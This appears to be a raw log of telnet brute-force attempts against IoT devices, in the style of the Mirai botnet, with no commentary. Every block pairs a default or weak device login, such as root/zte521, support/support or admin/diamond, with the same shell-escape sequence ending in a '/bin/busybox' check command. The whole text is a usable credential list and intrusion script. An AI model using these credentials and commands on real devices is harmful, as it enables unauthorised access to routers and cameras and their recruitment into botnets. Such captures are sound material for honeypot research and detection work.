root

antslq
enable
system
shell
sh
/bin/busybox xn6aeqri
diag

danger
enable
system
shell
sh
/bin/busybox xn6aeqri
root

权限
enable
system
shell
sh
/bin/busybox xn6aeqri
root

zte521
enable
system
shell
sh
/bin/busybox xn6aeqri
888888

888888
enable
system
shell
sh
/bin/busybox xn6aeqri
ascend
enable
system
shell
sh
/bin/busybox xn6aeqri
sync
enable
system
shell
sh
/bin/busybox xn6aeqri
support

support
enable
system
shell
sh
/bin/busybox xn6aeqri
root

tl789
enable
system
shell
sh
/bin/busybox xn6aeqri
admin
enable
system
shell
sh
/bin/busybox xn6aeqri
db2inst1

db2inst1
enable
system
shell
sh
/bin/busybox xn6aeqri
666666

666666
enable
system
shell
sh
/bin/busybox xn6aeqri
root

ascend
enable
system
shell
sh
/bin/busybox xn6aeqri
qmik
enable
system
shell
sh
/bin/busybox xn6aeqri
root

123456
enable
system
shell
sh
/bin/busybox xn6aeqri
admin

diamond
enable
system
shell
sh
/bin/busybox xn6aeqri
operator
enable
system
shell
sh
/bin/busybox xn6aeqri
stoogr
enable
system
shell
sh
/bin/busybox xn6aeqri
root
enable
system
shell
sh
/bin/busybox xn6aeqri
root

888888
enable
system
shell
sh
/bin/busybox xn6aeqri
